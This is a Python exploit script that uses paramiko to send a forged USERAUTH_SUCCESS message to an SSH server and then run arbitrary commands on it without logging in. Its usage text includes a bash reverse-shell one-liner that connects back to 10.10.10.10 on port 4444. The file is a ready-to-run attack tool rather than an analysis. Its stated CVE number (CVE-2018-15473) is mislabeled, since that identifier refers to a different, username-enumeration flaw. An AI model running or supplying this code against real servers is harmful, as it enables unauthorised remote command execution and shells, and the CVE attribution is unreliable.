#!/usr/bin/env python3
import paramiko
import socket
import sys

# --- ANSI Color Codes for Metasploit-style Logging ---
class Colors:
    GREEN = '\033[92m'  # [+] Success
    YELLOW = '\033[93m' # [*] Status/Info
    RED = '\033[91m'    # [-] Error/Failure
    ENDC = '\033[0m'    # Reset color

# --- Logging Helper Functions ---
def log_status(message):
    """Logs general process information (Metasploit [*] style)"""
    print(f"{Colors.YELLOW}[*]{Colors.ENDC} {message}")

def log_success(message):
    """Logs successful execution steps (Metasploit [+] style)"""
    print(f"{Colors.GREEN}[+]{Colors.ENDC} {message}")

def log_error(message):
    """Logs errors and failures (Metasploit [-] style)"""
    print(f"{Colors.RED}[-]{Colors.ENDC} {message}")

def log_result(output):
    """Displays the raw command output"""
    print("\n--- Command Output ---")
    print(output.strip())
    print("----------------------\n")

# --- Function to display usage ---
def show_usage():
    """Displays usage instructions and exits."""
    print("\n" + "="*30)
    print(" SSH Authentication Bypass Exploit")
    print("="*30)
    log_status(f"Usage: python3 {sys.argv[0]} <IP> <PORT> \"<COMMAND>\"")
    log_status("Description: Executes a command on the target via SSH bypass (CVE-2018-15473/Paramiko flaw).")
    log_status("Example 1 (Direct Command): python3 exploit.py 192.168.1.100 22 'whoami'")
    log_status("Example 2 (Reverse Shell): python3 exploit.py 192.168.1.100 22 \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"")
    print("\n")
    sys.exit(0)

# --- Main Exploit Logic ---

# Check Argument
if len(sys.argv) < 4:
    # Check if the user ran with --help
    if len(sys.argv) == 2 and sys.argv[1] in ('-h', '--help'):
        show_usage()
        
    # If arguments are insufficient, show usage and exit with error
    log_error("Error: Missing IP, PORT, or COMMAND.")
    log_status(f"Usage: python3 {sys.argv[0]} <IP> <PORT> \"<COMMAND>\"")
    sys.exit(1)

hostname = sys.argv[1]
port = int(sys.argv[2])
command = sys.argv[3]

# Create Socket 
sock = socket.socket()
try:
    log_status(f"Attempting connection to {hostname}:{port}...")
    sock.connect((hostname, port))
    log_success("Connection established.")
    
    # Paramiko Transport
    transport = paramiko.Transport(sock)
    transport.start_client()
    log_status("SSH transport initialized.")
    
    # === USERAUTH_SUCCESS Bypass ===
    m = paramiko.message.Message()
    m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(m)
    log_success("Authentication bypass message sent (USERAUTH_SUCCESS).")
    
    # Open Session 
    session = transport.open_session()
    log_status(f"Session opened. Executing command: '{command}'")
    session.exec_command(command)
    
    # Read Output
    stdout = session.makefile("rb", 2048)
    stderr = session.makefile_stderr("rb", 2048)
    
    output = stdout.read().decode('utf-8')
    error = stderr.read().decode('utf-8')
    
    # Print results
    if output:
        log_success("STDOUT received.")
        log_result(output)
    if error:
        log_error("STDERR received.")
        log_result(error)
    
    session.close()

except Exception as e:
    log_error(f"Execution Failed: {e}")
    if "Connection refused" in str(e):
        log_status("Verify the target is running an SSH service.")

finally:
    if 'transport' in locals() and transport.is_active():
        transport.close()
    if 'sock' in locals():
        sock.close()
